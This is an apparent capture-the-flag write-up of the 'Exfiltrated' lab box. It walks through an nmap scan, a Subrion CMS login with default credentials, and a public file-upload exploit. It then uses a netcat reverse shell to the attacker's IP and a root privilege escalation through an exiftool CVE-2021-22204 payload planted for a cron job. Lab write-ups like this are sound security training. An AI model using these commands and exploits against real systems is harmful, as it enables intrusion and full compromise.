---
icon: ubuntu
---

# Exfiltrated - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.163 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 10:48 EDT
Nmap scan report for 192.168.118.163
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   29.57 ms 192.168.45.1
2   29.56 ms 192.168.45.254
3   29.78 ms 192.168.251.1
4   31.03 ms 192.168.118.163
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1435).png" alt=""><figcaption></figcaption></figure>

Upon visiting the site we get a redirect, I am going to add it to my /etc/hosts file

```
192.168.118.163	exfiltrated.offsec
```

<figure><img src="../../.gitbook/assets/image (1436).png" alt=""><figcaption></figcaption></figure>

nmap discovered robots.txt I am going to take a look at it

<figure><img src="../../.gitbook/assets/image (1437).png" alt=""><figcaption></figcaption></figure>

Visiting panel we are greeted with an admin panel and a version for subrion cms

<figure><img src="../../.gitbook/assets/image (1438).png" alt=""><figcaption></figcaption></figure>

Searchsploit:

<figure><img src="../../.gitbook/assets/image (1439).png" alt=""><figcaption></figcaption></figure>

There is an arbitrary file upload I am going to download it and take a look at it:

```
searchsploit -m 49876
```

### <mark style="color:$primary;">Subrion CMS 4.2.1 Arbitrary File Upload</mark>

we need some credentials to get this exploit to work, luckily for us admin:admin works on the admin panel!

<figure><img src="../../.gitbook/assets/image (1440).png" alt=""><figcaption></figcaption></figure>

```
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

<figure><img src="../../.gitbook/assets/image (1441).png" alt=""><figcaption></figcaption></figure>

It worked and we got a shell as www-data. I am going to use nc to get a reverse shell:

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1442).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

```
wget 192.168.45.158/pspy64
```

<figure><img src="../../.gitbook/assets/image (1445).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Pspy</mark>

```
timeout 3m ./pspy64
```

<figure><img src="../../.gitbook/assets/image (1444).png" alt=""><figcaption></figcaption></figure>

there is a cron job running in the background as root on /opt/image-exif.sh

<figure><img src="../../.gitbook/assets/image (1446).png" alt=""><figcaption></figcaption></figure>

So we have a crontab running and collecting metadata from /var/www/html/subrion/uploads jpg files. Let's look for an exploit for exiftool&#x20;

<figure><img src="../../.gitbook/assets/image (1457).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Exiftool 12.23 - Arbitrary Code Execution</mark>

the searchsploit version did not work for me so I went ahead and found a better script on [**Github**](https://github.com/UNICORDev/exploit-CVE-2021-22204)

```
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
```

```
python3 exploit-CVE-2021-22204.py -s 192.168.45.243 443
```

<figure><img src="../../.gitbook/assets/image (1458).png" alt=""><figcaption></figcaption></figure>

Now we need to place this image in the /var/www/html/subrion/uploads folder and wait for our shell!

```
wget 192.168.45.243/image.jpg
```

<figure><img src="../../.gitbook/assets/image (1459).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1460).png" alt=""><figcaption></figcaption></figure>

and we are root!
